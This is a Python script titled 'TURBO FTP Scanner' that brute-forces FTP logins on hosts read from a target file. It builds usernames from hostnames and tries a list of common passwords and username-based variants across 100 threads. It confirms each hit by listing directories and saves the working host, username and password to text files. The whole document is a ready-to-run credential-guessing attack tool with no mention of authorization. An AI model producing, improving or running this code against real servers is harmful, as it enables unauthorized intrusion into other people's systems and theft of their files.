#!/usr/bin/env python3

import ftplib
import sys
import socket
import threading
import time
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import queue
import os

# Aggressive performance settings
socket.setdefaulttimeout(10)  # Increased from 8 to 10 seconds
MAX_WORKERS = 100  # High thread count
CHUNK_SIZE = 200  # Process in chunks

# Global counters
results_lock = threading.Lock()
stats = {'success': 0, 'attempts': 0, 'start_time': 0}

def extract_username_from_host(host):
    """Fast username extraction"""
    return host.split('.')[0] if '.' in host else host

def generate_passwords(username):
    """Enhanced password generation with commonly used passwords"""
    # Common passwords (removed the ones you specified)
    base_passwords = [
        'Password1', 'Password123', 'Welcome1', 'Welcome123', 'Change123',
        'Qwer1234', 'Qwerty123', 'Abcd1234', 'Abc123456', 'Ab123456',
        'Woaini520', 'Woaini1314', 'Qq111111', 'Qq123123', 'Aa111111',
        'Aa123123', 'Aa112233', 'Qq112233', 'Admin2023', 'Admin2024',
        'Admin2025', 'Master123', 'Manager1', 'Manager123', 'Superman',
        'Baseball', 'Football', 'Sunshine', 'Princess', 'Computer',
        'Internet', 'Whatever', 'Iloveyou', 'Trustno1', 'Asdfghjk',
        'Qwertyui', 'Letmein1', 'Dragon123', 'Michael1', 'Jessica1',
        'Jennifer', 'Michelle', 'Matthew1', 'P@ssword', 'Test1234',
        'User1234', 'Admin1234', 'Root1234', 'System123', 'Windows1',
        'Windows123', 'Login123', 'Access123', 'Abcdefgh', 'Abcabc123',
        'Qazwsx123', 'Qweasd123', 'Zxc123456', 'Asd123456', 'Qwe123456',
        'Sample123', 'Default1', 'Default123', 'Startup1', 'Startup123'
    ]

    # Username-based passwords
    user_passwords = [username]

    # Username combinations
    combo_passwords = [
        f"{username}123",
        f"{username}@123",
        f"{username}2023",
        f"{username}2024",
        f"{username}2025",
    ]

    # Return unique passwords, prioritize common ones first
    seen = set()
    passwords = []
    for pwd_list in [base_passwords, user_passwords, combo_passwords]:
        for pwd in pwd_list:
            if pwd not in seen:
                seen.add(pwd)
                passwords.append(pwd)
    return passwords

def test_ftp_fast(host, username, password, port=21):
    """Reliable FTP test with proper timeout to avoid false positives"""
    start_time = time.time()

    try:
        # Create socket with reliable settings
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(8)  # Fixed: Changed from 5 to 8 seconds to match pattern
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        # This is where the actual network time is spent
        sock.connect((host, port))

        # Read banner with patience
        banner = sock.recv(1024)
        if b'220' not in banner:
            sock.close()
            return False, "No FTP service"

        # Send USER command
        sock.send(f"USER {username}\r\n".encode('ascii'))
        time.sleep(0.1)  # Added 0.1s delay as requested
        user_resp = sock.recv(1024)

        if b'331' not in user_resp and b'230' not in user_resp:
            sock.close()
            return False, "User rejected"

        # Send PASS command with proper wait
        sock.send(f"PASS {password}\r\n".encode('ascii'))
        time.sleep(0.1)  # Added 0.1s delay as requested
        pass_resp = sock.recv(1024)

        # Thorough check for success - avoid false positives
        success = b'230' in pass_resp and b'Login successful' in pass_resp or b'logged in' in pass_resp.lower() or (b'230' in pass_resp and b'User' in pass_resp)

        sock.close()

        conn_time = time.time() - start_time

        if success:
            # Double-verify with proper FTP connection
            try:
                ftp = ftplib.FTP()
                ftp.encoding = 'latin1'
                ftp.connect(host, port, timeout=8)  # Increased from 5 to 8 seconds
                welcome = ftp.login(username, password)

                # Get directory listing for confirmation
                try:
                    files = ftp.nlst()[:3]  # Get first 3 files
                    current_dir = ftp.pwd()
                except:
                    files = ["access-confirmed"]
                    current_dir = "/"

                ftp.quit()

                return True, {
                    'host': host,
                    'username': username,
                    'password': password,
                    'files': files,
                    'directory': current_dir,
                    'welcome': welcome,
                    'timestamp': datetime.now().strftime('%H:%M:%S'),
                    'conn_time': conn_time
                }
            except Exception as verify_error:
                # If verification fails, it was likely a false positive
                return False, f"Verification failed: {str(verify_error)[:30]}"

        return False, f"Auth failed ({conn_time:.1f}s)"

    except socket.timeout:
        conn_time = time.time() - start_time
        return False, f"Timeout ({conn_time:.1f}s)"
    except ConnectionRefusedError:
        conn_time = time.time() - start_time
        return False, f"Refused ({conn_time:.1f}s)"
    except Exception as e:
        conn_time = time.time() - start_time
        return False, f"Error: {str(e)[:20]} ({conn_time:.1f}s)"

def process_batch(batch_tasks):
    """Process a batch of tasks efficiently"""
    local_results = []

    for host, username, password in batch_tasks:
        with results_lock:
            stats['attempts'] += 1
            current = stats['attempts']

        # Minimal progress display (every 25th attempt)
        if current % 25 == 0 or current <= 50:
            elapsed = time.time() - stats['start_time']
            # Calculate actual rate based on completed attempts
            rate = current / elapsed if elapsed > 0 else 0
            # Show realistic progress
            print(f"\r[{current:5d}] {rate:6.1f}/s - {host[:25]}:{username[:12]}:{password[:10]} ", end='', flush=True)

        success, result = test_ftp_fast(host, username, password)

        if success:
            with results_lock:
                stats['success'] += 1

            # Live output with full details
            print(f"\n✓ SUCCESS #{stats['success']}: {host}")
            print(f"   → Credentials: {username}:{password}")
            print(f"   → Directory: {result.get('directory', '/')}")
            print(f"   → Files: {', '.join(result['files'][:3])}")
            print(f"   ⏱  Time: {result.get('conn_time', 0):.1f}s")
            print(f"   → Welcome: {result.get('welcome', 'N/A')[:50]}")

            # Save to file immediately with full details
            save_result_detailed(result)
            local_results.append(result)

        # Added small delay between attempts as requested
        time.sleep(0.1)

    return local_results

def save_result_detailed(result):
    """Save detailed results with live output"""
    try:
        with results_lock:
            # Write to main vulns file with full details
            with open("vuln-found.txt", 'a', encoding='utf-8', buffering=1) as f:
                f.write(f"\n{'='*60}\n")
                f.write(f"[{result['timestamp']}] FTP ACCESS FOUND\n")
                f.write(f"Host: {result['host']}:21\n")
                f.write(f"Username: {result['username']}\n")
                f.write(f"Password: {result['password']}\n")
                f.write(f"Directory: {result.get('directory', '/')}\n")
                f.write(f"Files: {', '.join(result['files'])}\n")
                f.write(f"Welcome: {result.get('welcome', 'N/A')}\n")
                f.write(f"Connection Time: {result.get('conn_time', 0):.1f}s\n")
                f.write(f"{'='*60}\n")

            # Also save to simple format for quick parsing
            with open("credentials-only.txt", 'a', encoding='utf-8', buffering=1) as f:
                f.write(f"{result['host']}:{result['username']}:{result['password']}\n")

    except Exception as e:
        print(f"⚠ Save error: {e}")

def save_result_fast(result):
    """Fast file writing"""
    try:
        with results_lock:
            with open("vuln-found.txt", 'a', encoding='utf-8', buffering=1) as f:
                f.write(f"[{result['timestamp']}] {result['host']} | {result['username']}:{result['password']} | {','.join(result['files'][:2])}\n")
    except:
        pass

def load_targets_fast():
    """Fast file loading"""
    try:
        with open("all-targets.txt", 'r') as f:
            return [line.strip() for line in f if line.strip() and not line.startswith('#')]
    except FileNotFoundError:
        print("⚠ all-targets.txt not found!")
        sys.exit(1)

def create_task_batches(targets):
    """Create optimized task batches"""
    all_tasks = []

    # Pre-generate all tasks
    for host in targets:
        username = extract_username_from_host(host)
        passwords = generate_passwords(username)
        for password in passwords:
            all_tasks.append((host, username, password))

    # Split into batches
    batches = []
    for i in range(0, len(all_tasks), CHUNK_SIZE):
        batches.append(all_tasks[i:i + CHUNK_SIZE])

    return batches, len(all_tasks)

def main():
    print("🚀 TURBO FTP Scanner - Maximum Speed Mode")
    print("=" * 50)

    # Fast startup
    targets = load_targets_fast()
    print(f"📋 {len(targets)} targets loaded")

    batches, total_tasks = create_task_batches(targets)
    print(f"⚡ {total_tasks} tasks | {len(batches)} batches | {MAX_WORKERS} threads")

    # Initialize stats
    stats['start_time'] = time.time()

    # Clear old results files
    try:
        os.remove("vuln-found.txt")
        os.remove("credentials-only.txt")
    except:
        pass

    print("🔍 SCANNING...")
    print("-" * 50)

    # Execute with maximum parallelism
    all_results = []

    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        # Submit all batches
        future_to_batch = {executor.submit(process_batch, batch): batch for batch in batches}

        # Process results as they complete
        for future in as_completed(future_to_batch):
            try:
                batch_results = future.result()
                all_results.extend(batch_results)
            except Exception as e:
                pass  # Ignore individual batch failures

    # Final results
    elapsed = time.time() - stats['start_time']

    print(f"\n{'='*50}")
    print(f"✅ SPEED RESULTS:")
    print(f"🎯 Found: {stats['success']} valid credentials")
    print(f"⚡ Speed: {stats['attempts']}/{elapsed:.1f}s = {stats['attempts']/elapsed:.1f} attempts/sec")
    print(f"📊 Success rate: {stats['success']/stats['attempts']*100:.1f}%")

    if stats['success'] > 0:
        print(f"📄 Detailed results: vuln-found.txt")
        print(f"📄 Credentials only: credentials-only.txt")

        # Show summary of found credentials
        print(f"\n🔑 FOUND CREDENTIALS SUMMARY:")
        try:
            with open("credentials-only.txt", 'r') as f:
                for i, line in enumerate(f, 1):
                    if line.strip():
                        print(f"   {i:2d}. {line.strip()}")
        except:
            pass
    else:
        print("❌ No valid credentials found")

    return 0 if stats['success'] > 0 else 1

if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print(f"\n⚠ Interrupted! Found {stats['success']} credentials so far")
        sys.exit(0)
